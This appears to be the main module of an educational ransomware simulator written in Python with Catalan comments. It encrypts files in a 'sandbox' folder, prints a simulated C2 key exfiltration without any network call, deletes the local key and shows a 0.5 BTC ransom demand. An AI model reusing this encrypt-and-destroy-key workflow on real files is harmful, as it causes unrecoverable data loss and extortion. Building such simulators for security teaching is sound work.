import os

import file_manager                 

import crypto_engine

# --- CONFIGURACIO I CONSTANTS ---
RUTA_SANDBOX = "sandbox"

RUTA_CLAU = "config_sys_04.dat"
PROHIBITED_WHITELIST = [".py", ".key", ".exe", ".dll", ".sys", ".locked", ".ini", ".lnk", ".bat", ".dat"]


RUTA_PROPIA = os.path.dirname(os.path.abspath(__file__))

def simular_exfiltracio_clau():
    print("\n" + "-"*40)
    print("[CONNEXIO] Connectant amb el servidor C2...")
    print("[INFO] Enviant clau de xifratge de forma segura...")
    file_manager.registrar_log("CLAU EXFILTRADA AL SERVIDOR EXTERN", "CRITICAL")
    print("[✔] CLAU ENVIADA. Copia de seguretat eliminada del control de l'usuari.")
    print("-"*40)

def mostrar_menu():             
    file_manager.registrar_log("SESSIO INICIADA AL SIMULADOR", "INFO")                   
    while True:
        print("\n" + "=" * 32)
        print("   SIMULADOR DE RANSOMWARE")    
        print("=" * 32)
        print("1. Infectar (Xifrar)")          
        print("2. Recuperar (Desxifrar)")       
        print("3. Veure historial (Logs)")      
        print("4. Sortir")                      
        
        opcio = input("\nTria una opcio (1-4): ")        
        
        if opcio == "1":
            file_manager.registrar_log("INICIANT INFECCIÓ", "INFO")
            
            if not os.path.exists(RUTA_SANDBOX):
                print("[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX")
                continue
                
            # Generacio i Exfiltracio (SDR-16)
            print("\n[+] GENERANT ALGORITME DE SEGURETAT...")
            crypto_engine.generar_i_guardar_clau(RUTA_CLAU)
            simular_exfiltracio_clau()
            
            clau = crypto_engine.carregar_clau(RUTA_CLAU)
            llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)

            for ruta_completa in llista_arxius:
                # SDR-24: Filtre de carpeta
                carpeta_fitxer = os.path.dirname(os.path.abspath(ruta_completa))
                if carpeta_fitxer == RUTA_PROPIA:
                    continue

                # Filtre d'extensions
                nom_arxiu, extensio = os.path.splitext(ruta_completa)
                if extensio.lower() in PROHIBITED_WHITELIST:
                    continue

                crypto_engine.xifrar_arxiu(ruta_completa, clau)

            file_manager.generar_nota_rescat(RUTA_SANDBOX)


            
            # SDR-16: Autodestruccio de la clau local
            if os.path.exists(RUTA_CLAU):
                os.remove(RUTA_CLAU)
                print("\n[!] ATENCIO: Clau local destruida per seguretat.")
                file_manager.registrar_log("CLAU LOCAL ELIMINADA", "CRITICAL")
            
            print(f"\n[✔] INFECCIO COMPLETADA A {RUTA_SANDBOX}")

        elif opcio == "2":
            clau = crypto_engine.carregar_clau(RUTA_CLAU)
            
            if not clau:
                # SDR-16: El missatge de rescat
                print("\n" + "!" * 40)
                print("⚠️  SISTEMA DE RECUPERACIO BLOQUEJAT  ⚠️")
                print("No s'ha trobat la clau: config_sys_04.dat")
                print("Rescat: Envia 0.5 BTC a l'adreça del servidor C2.")
                print("!" * 40)
                file_manager.registrar_log("INTENT DE RECUPERACIO SENSE CLAU", "WARNING")
                continue

            # Si la clau existeix (perque l'hem posat manualment per provar), desxifra:
            llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)
            for ruta_completa in llista_arxius:
                if ruta_completa.endswith(".locked"):
                    crypto_engine.desxifrar_arxiu(ruta_completa, clau)

        elif opcio == "3":
            file_manager.llegir_logs()
            
        elif opcio == "4":
            break

if __name__ == "__main__":
    mostrar_menu()

